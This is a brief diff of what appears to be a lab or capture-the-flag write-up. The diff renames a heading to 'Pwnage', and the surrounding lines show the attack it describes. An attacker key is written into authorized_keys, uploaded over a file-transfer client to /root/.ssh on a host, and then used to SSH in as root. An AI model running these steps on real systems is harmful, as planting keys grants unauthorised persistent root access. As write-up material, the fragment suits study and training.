@@ -259,7 +259,7 @@ echo "...qqylmxz/qWAaEmk= root@kali" > authorized_keys
 root@7b05c5df3d55:/app/cron# python3 client_py.py 172.17.0.1 69 upload authorized_keysFile sent successfully to remote path: /root/.ssh/authorized_keys
 ```
 
-## Reverse Shell to Host
+## Pwnage
 
 ```shell
 ssh -i /root/.ssh/id_rsa root@10.130.128.174
